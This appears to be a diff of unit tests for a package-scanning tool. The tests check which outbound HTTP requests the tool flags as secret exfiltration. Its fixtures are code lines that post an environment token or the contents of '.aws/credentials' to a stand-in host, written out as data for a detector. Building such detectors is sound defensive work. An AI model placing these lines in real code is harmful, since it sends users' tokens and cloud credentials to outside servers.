@@ -33,6 +33,7 @@ class RealPackageRegressions(unittest.TestCase):
     def test_authentication_alone_cannot_confirm_exfiltration(self):
         for statement in [
             "requests.post('https://service.invalid', headers={'Authorization': os.getenv('SERVICE_TOKEN')})",
+            "requests.post('https://service.invalid', params={'token': os.getenv('SERVICE_TOKEN')})",
             "req=urllib.request.Request('https://service.invalid', headers={'Authorization': os.getenv('SERVICE_TOKEN')})\nurllib.request.urlopen(req)",
         ]:
             report = self.scan({"main.py": "import os, requests, urllib.request\n" + statement})
@@ -46,7 +47,7 @@ class RealPackageRegressions(unittest.TestCase):
     def test_secret_payload_and_stolen_credentials_still_confirm_danger(self):
         for payload in [
             "data=os.getenv('SERVICE_TOKEN')",
-            "params={'token': os.getenv('SERVICE_TOKEN')}",
+            "params={'dump': os.getenv('SERVICE_TOKEN')}",
             "headers={'Authorization': open('.aws/credentials').read()}",
         ]:
             report = self.scan(
